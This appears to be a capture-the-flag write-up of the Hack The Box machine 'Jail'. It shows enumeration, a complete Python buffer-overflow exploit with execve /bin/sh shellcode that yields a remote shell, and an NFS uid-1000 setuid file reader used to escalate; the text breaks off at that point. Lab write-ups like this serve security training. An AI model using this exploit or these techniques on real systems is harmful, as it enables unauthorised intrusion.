---
layout: post
title: Jail(HTB)
categories:
  - Writeup
---

<br>OS Linux
<br>IP: 10.10.10.34

**Nmap**:-
<font size="1">
<div style="height:300px;width:600px;overflow:auto;background-color:#262626;color:White;scrollbar-base-color:gold;font-family:monospace;padding:10px;">
<p><font color="red">root@kali</font>:<font color="RoyalBlue">~/Desktop</font># nmap -sS -A 10.10.10.34</p>

<p>Starting Nmap 7.50 ( https://nmap.org ) at 2018-02-20 22:26 EST
<br>Nmap scan report for 10.10.10.34
<br>Host is up (0.17s latency).
<br>Not shown: 996 filtered ports
<br>PORT     STATE SERVICE VERSION
<br><font color="BB69EC">22/tcp</font>   open  ssh     <font color="53E100">OpenSSH 6.6.1 (protocol 2.0)</font>
<br>| ssh-hostkey: 
<br>|   2048 cd:ec:19:7c:da:dc:16:e2:a3:9d:42:f3:18:4b:e6:4d (RSA)
<br>|   256 af:94:9f:2f:21:d0:e0:1d:ae:8e:7f:1d:7b:d7:42:ef (ECDSA)
<br>|_  256 6b:f8:dc:27:4f:1c:89:67:a4:67:c5:ed:07:53:af:97 (EdDSA)
<br><font color="BB69EC">80/tcp</font>   open  http    <font color="53E100">Apache httpd 2.4.6 ((CentOS))</font>
<br>| http-methods: 
<br>|_  Potentially risky methods: TRACE
<br>|_http-server-header: Apache/2.4.6 (CentOS)
<br>|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
<br><font color="BB69EC">111/tcp</font>  open  <font color="53E100">rpcbind 2-4 (RPC #100000)</font>
<br>| rpcinfo: 
<br>|   program version   port/proto  service
<br>|   100000  2,3,4        111/tcp  rpcbind
<br>|   100000  2,3,4        111/udp  rpcbind
<br>|   100003  3,4         2049/tcp  nfs
<br>|   100003  3,4         2049/udp  nfs
<br>|   100005  1,2,3      20048/tcp  mountd
<br>|   100005  1,2,3      20048/udp  mountd
<br>|   100021  1,3,4      42049/tcp  nlockmgr
<br>|   100021  1,3,4      57851/udp  nlockmgr
<br>|   100024  1          50323/udp  status
<br>|   100024  1          57733/tcp  status
<br>|   100227  3           2049/tcp  nfs_acl
<br>|_  100227  3           2049/udp  nfs_acl
<br><font color="BB69EC">2049/tcp</font> open  <font color="53E100">nfs_acl 3 (RPC #100227)</font>
<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
<br>Aggressive OS guesses: Linux 3.10 - 4.8 (91%), Linux 3.18 (91%), Linux 3.2 - 4.8 (91%), Crestron XPanel control system (89%), Linux <br>3.16 (88%), HP P2000 G3 NAS device (86%), ASUS RT-N56U WAP (Linux 3.4) (86%), Linux 3.1 (86%), Linux 3.2 (86%), AXIS 210A or 211 <br>Network Camera (Linux 2.6.17) (86%)
<br>No exact OS matches for host (test conditions non-ideal).
<br>Network Distance: 2 hops</p>

<p>TRACEROUTE (using port 80/tcp)
<br>HOP RTT       ADDRESS
<br>1   180.47 ms 10.10.14.1
<br>2   180.52 ms 10.10.10.34</p>

<p>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
<br>Nmap done: 1 IP address (1 host up) scanned in 43.29 seconds
<br><font color="red">root@kali</font>:<font color="RoyalBlue">~/Desktop</font>#</p> 
</div>
</font>

**Web**:-

![1](https://teckk2.github.io/assets/images/jail/1.png)
<br>Nothing useful lets bruteforce the directories.

<font size="1">
<div style="height:200px;width:600px;overflow:auto;background-color:#262626;color:White;scrollbar-base-color:gold;font-family:monospace;padding:10px;">
<p><font color="red">root@kali</font>:<font color="RoyalBlue">~/Desktop</font># gobuster -e -u http://10.10.10.34/ -t 500 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt</p> 

<p>Gobuster v1.2                OJ Reeves (@TheColonial)
<br>=====================================================
<br>[+] Mode         : dir
<br>[+] Url/Domain   : http://10.10.10.34/
<br>[+] Threads      : 500
<br>[+] Wordlist     : /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
<br>[+] Status codes : 301,302,307,200,204
<br>[+] Expanded     : true
<br>=====================================================
<br>http://10.10.10.34<font color="53E100">/jailuser (Status: 301)</font>
<br>=====================================================
<br><font color="red">root@kali</font>:<font color="RoyalBlue">~/Desktop</font>#</p>
</div>
</font>

<br>There is another directory named /jailuser let’s open it and check what it has
![2](https://teckk2.github.io/assets/images/jail/2.png)
<br>It has 3 files Open Jail.c and analyzed it,In there I found something interesting. It has admin password in it, which we don’t know where to use.
![3](https://teckk2.github.io/assets/images/jail/3.png)
<br>And in the below lines it’s showing the port 7411
![4](https://teckk2.github.io/assets/images/jail/4.png)
<br>Let’s check and try to connect with it and check what service is running inside it.

<font size="1">
<div style="height:200px;width:600px;overflow:auto;background-color:#262626;color:White;scrollbar-base-color:gold;font-family:monospace;padding:10px;">
<p><font color="red">root@kali</font>:<font color="RoyalBlue">~/Desktop</font># nc -v 10.10.10.34 7411
<br>10.10.10.34: inverse host lookup failed: Unknown host
<br>(UNKNOWN) [10.10.10.34] 7411 (?) open
<br>OK Ready. Send USER command.
<br><font color="53E100">DEBUG ON</font>
<br>OK DEBUG mode on.
<br><font color="53E100">USER admin</font>
<br>OK Send PASS command.
<br><font color="53E100">PASS 1974jialbreak!</font>
<br>Debug: userpass buffer @ <font color="ffff00">0xffffd610</font>
<br>Incorrect username and/or password.
<br>ERR Authentication failed.
<br><font color="red">root@kali</font>:<font color="RoyalBlue">~/Desktop</font>#</p>
</div>
</font>

<br>With the admin username and password which we got from the jail.c file it accepted the connection, and it gave us the userpass buffer address, maybe we can use this in future.
<br>After roaming on the port 80 and 7411 for some time I couldn’t find anything further, So let’s jump and focus on the 3rd port which we found in the nmap which is port 111, It has nfs open which stands for Network File share let’s enumerate this maybe we could find something interesting in it.
<br>First we need to install rpcbind nfs tool to be able to mount the folder to our local machine, If you already have this then you can jump to the next step.
<br><font color="red">root@kali</font>:<font color="RoyalBlue">~/Desktop</font># <font color="Black">apt-get install rpcbind nfs-common</font>
<br>Now first do the command showmount with the respective target IP address which will show us the available nfs folders.

<font size="1">
<div style="height:100px;width:600px;overflow:auto;background-color:#262626;color:White;scrollbar-base-color:gold;font-family:monospace;padding:10px;">
<p><font color="red">root@kali</font>:<font color="RoyalBlue">~/Desktop</font># showmount -e 10.10.10.34
<br>Export list for 10.10.10.34:
<br>/opt          *
<br>/var/nfsshare *
<br><font color="red">root@kali</font>:<font color="RoyalBlue">~/Desktop</font>#</p> 
</div>
</font>
<br>As you can see the /opt and /var/nfsshare folder are available to mount
<br>Now before we proceed we need to create a user with the uid 1000 in able to read the mounted file, because the shared mount folder is only accessible to the users which has uid 1000
<font size="1">
<div style="height:300px;width:600px;overflow:auto;background-color:#262626;color:White;scrollbar-base-color:gold;font-family:monospace;padding:10px;">
<p><font color="red">teck@kali</font>:<font color="RoyalBlue">/root/Desktop</font>$ id
<br>uid=1000(teck) gid=1000(teck) groups=1000(teck)
<br><font color="red">teck@kali</font>:<font color="RoyalBlue">/root/Desktop</font>$ sudo showmount -e 10.10.10.34
<br>Export list for 10.10.10.34:
<br><font color="ffff00">/opt</font>          *
<br><font color="ffff00">/var/nfsshare</font> *
<br><font color="red">teck@kali</font>:<font color="RoyalBlue">/root/Desktop</font>$ sudo mount -t nfs 10.10.10.34:/var/nfsshare <br>/var/nfsshare/ -o nolock
<br>mount.nfs: mount point /var/nfsshare/ does not exist
<br><font color="red">teck@kali</font>:<font color="RoyalBlue">/root/Desktop</font>$ sudo mkdir /var/nfsshare
<br><font color="red">teck@kali</font>:<font color="RoyalBlue">/root/Desktop</font>$ sudo mount -t nfs 10.10.10.34:/var/nfsshare <br>/var/nfsshare/ -o nolock
<br><font color="red">teck@kali</font>:<font color="RoyalBlue">/root/Desktop</font>$ cd /opt/
<br><font color="red">teck@kali</font>:<font color="RoyalBlue">/opt</font>$ ls -l
<br>total 0
<br>drwxr-x--- 2 root root 26 Jun 26  2017 logreader
<br>drwxr-xr-x 2 root root  6 Mar 26  2015 rh
<br><font color="red">teck@kali</font>:<font color="RoyalBlue">/opt</font>$ cd logreader/
<br><font color="red">teck@kali</font>:<font color="RoyalBlue">/opt/logreader</font>$ ls -la
<br>total 4
<br>drwxr-x--- 2 root root 26 Jun 26  2017 .
<br>drwxr-xr-x 4 root root 33 Jun 25  2017 ..
<br>-rwxr-x--- 1 root root 52 Jun 26  2017 <font color="53E100">logreader.sh</font>
<br><font color="red">teck@kali</font>:<font color="RoyalBlue">/opt/logreader</font>$ cat logreader.sh 
<br>#!/bin/bash
<br>/bin/cat /home/frank/logs/checkproc.log
<br><font color="red">teck@kali</font>:<font color="RoyalBlue">/opt/logreader</font>$ ./logreader.sh
<br>/bin/cat: /home/frank/logs/checkproc.log: No such file or directory
<br><font color="red">teck@kali</font>:<font color="RoyalBlue">/opt/logreader</font>$ </p>
</div>
</font>

<br>And as you can see there is not much information available as the file is just trying to cat the checkproc.log file and nothing else
<br>After trying a lot of stuff, when I tried to connect with port 7411 again and this time when I type OPEN in the end it send me the output OK Jail doors opened, this is weird I really don’t know what this means.

<font size="1">
<div style="height:200px;width:600px;overflow:auto;background-color:#262626;color:White;scrollbar-base-color:gold;font-family:monospace;padding:10px;">
<p><font color="red">teck@kali</font>:<font color="RoyalBlue">/root/Desktop</font>$ nc -v 10.10.10.34 7411
<br>10.10.10.34: inverse host lookup failed: Unknown host
<br>(UNKNOWN) [10.10.10.34] 7411 (?) open
<br>OK Ready. Send USER command.
<br>DEBUG ON
<br>OK DEBUG mode on.
<br>USER admin
<br>OK Send PASS command.
<br>PASS 1974jailbreak!
<br>Debug: userpass buffer @ 0xffffd610
<br>OK Authentication success. Send command.
<br><font color="ffff00">OPEN</font>
<br><font color="53E100">OK Jail doors opened.</font><font color="red">teck@kali</font>:<font color="RoyalBlue">/root/Desktop</font>$</p>
</div>
</font>

<br>Now we need to Debugg the C program which we found in the web.
![5](https://teckk2.github.io/assets/images/jail/5.PNG)
<br>After runnig, now connect to the program on local host and input some junk data or preferable lot of A's to check if we can crash the program and could overwrite the EIP.
![6](https://teckk2.github.io/assets/images/jail/6.PNG)
![7](https://teckk2.github.io/assets/images/jail/7.PNG)
<br>The EIP got overwritten with our A's that means we can control it.
<br>Now restart the program to find the correct offset
![8](https://teckk2.github.io/assets/images/jail/8.PNG)
![9](https://teckk2.github.io/assets/images/jail/9.PNG)
<br>Using patter create we will generate 50 bytes of junk data which we will put it in password field
![10](https://teckk2.github.io/assets/images/jail/10.PNG)
![11](https://teckk2.github.io/assets/images/jail/11.PNG)
<br>The program stop at 0x413b4141, now find the offset
![12](https://teckk2.github.io/assets/images/jail/12.PNG)
<br>The off-set is 28 now we can proceed to create our python exploit using the available data to gain a shell.

<font size="1">
<div style="height:300px;width:600px;overflow:auto;background-color:#262626;color:White;scrollbar-base-color:gold;font-family:monospace;padding:10px;">

<p><font color="red">teck@kali</font>:<font color="RoyalBlue">/root/Desktop</font>$ cat jail.py 
<br><font color="red"> #!/usr/bin/env python</font></p>

<p>import socket, sys, telnetlib</p>

<p>s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
<br>s.connect((<font color="53E100">'10.10.10.34'</font>, 7411))</p>

<p>print s.recv(1024)
<br>s.send(<font color="53E100">"DEBUG"</font>)
<br>print s.recv(1024)
<br>s.send(<font color="53E100">"USER admin"</font>)
<br>print s.recv(1024)</p>

<p> <font color="red"> # https://www.exploit-db.com/exploits/34060/</font>
<br> <font color="red"> # Linux/x86 - execve(/bin/sh) + Socket Re-Use Shellcode (50 bytes)</font>
<br> <font color="red"> # Buffer address (ffffd610) + Offset (28) = ffffd638</font>
<br>payload = <font color="53E100">"A"</font>*28 + <font color="53E100">"\x38\xd6\xff\xff"</font> + <font color="53E100">"\x90"</font>*10 + <font color="53E100">"\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6\x31\xc9\x56\x5b\x6a\x3f\x58\xcd\x80\x41\x80\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"</font>
<br>s.send(<font color="53E100">"PASS "</font> + payload)
<br>print s.recv(1024)</p>


<p>t = telnetlib.Telnet()
<br>t.sock = s
<br>t.interact()</p>

<p>s.close()
<br><font color="red">teck@kali</font>:<font color="RoyalBlue">/root/Desktop</font>$</p>

</div>
</font>

<br>Now save it and run the exploit if all goes right we will gain the shell.

<font size="1">
<div style="height:300px;width:600px;overflow:auto;background-color:#262626;color:White;scrollbar-base-color:gold;font-family:monospace;padding:10px;">
<p><font color="red">root@kali</font>:<font color="RoyalBlue">~/Desktop</font># ./jail.py 
<br>OK Ready. Send USER command.</p>

<p>OK DEBUG mode on.</p>

<p>OK Send PASS command.</p>

<p>Debug: userpass buffer @ 0xffffd610</p>

<p>id
<br>uid=99(nobody) gid=99(nobody) groups=99(nobody) context=system_u:system_r:unconfined_service_t:s0
<br><font color="BB69EC">python -c 'import pty;pty.spawn("/bin/bash")'</font>
<br>bash-4.2$</p> 
</div>
</font>

<br>We got the shell as user (nobody)
<font size="1">
<div style="height:300px;width:600px;overflow:auto;background-color:#262626;color:White;scrollbar-base-color:gold;font-family:monospace;padding:10px;">
<p>bash-4.2$ sudo -l
<br>sudo -l
<br>Matching Defaults entries for nobody on this host:
<br>&nbsp;&nbsp;&nbsp;&nbsp;!visiblepw, always_set_home, env_reset, env_keep="COLORS DISPLAY HOSTNAME
<br>&nbsp;&nbsp;&nbsp;&nbsp;HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG
<br>&nbsp;&nbsp;&nbsp;&nbsp;LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION
<br>&nbsp;&nbsp;&nbsp;&nbsp;LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC
<br>&nbsp;&nbsp;&nbsp;&nbsp;LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS
<br>&nbsp;&nbsp;&nbsp;&nbsp;_XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin</p>

<p>User nobody may run the following commands on this host:
<br>&nbsp;&nbsp;&nbsp;&nbsp;(frank) NOPASSWD: /opt/logreader/logreader.sh
<br>bash-4.2$ cd /opt/logreader
<br>cd /opt/logreader
<br>bash: cd: /opt/logreader: Permission denied
<br>bash-4.2$ </p>
</div>
</font>

<br>There is another user which is frank which has access to the file logreader.sh in /opt/logreader which is also shared in NFS, but as a nobody user we cannot access the folder, but if you remeber which the user teck which we created with UID 1000 we can access that folder.
<br>Now we will create a C program to read the User.txt

<font size="1">
<div style="height:100px;width:600px;overflow:auto;background-color:#262626;color:White;scrollbar-base-color:gold;font-family:monospace;padding:10px;">
<p>teck@kali:/var/nfsshare$ cat teck.c
<br>#include <stdio.h>
<br>#include <unistd.h>
<br>#include <sys/types.h></p>

<p>int main(int argc, char ** argv){
<br>&nbsp;&nbsp;&nbsp;&nbsp;setuid(1000);</p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;char line[101];</p>

<p>&nbsp;&nbsp;&nbsp;&nbsp;FILE *fp = fopen (argv[1], "r");</p>

<p>&nbsp;while(fgets(line, 100, fp) != NULL)
<br>&nbsp;{
<br>&nbsp;&nbsp;puts(line);
<br>&nbsp;}</p>

<p>&nbsp;fclose(fp);
<br>}
<br>teck@kali:/var/nfsshare$</p>
</div>
</font>

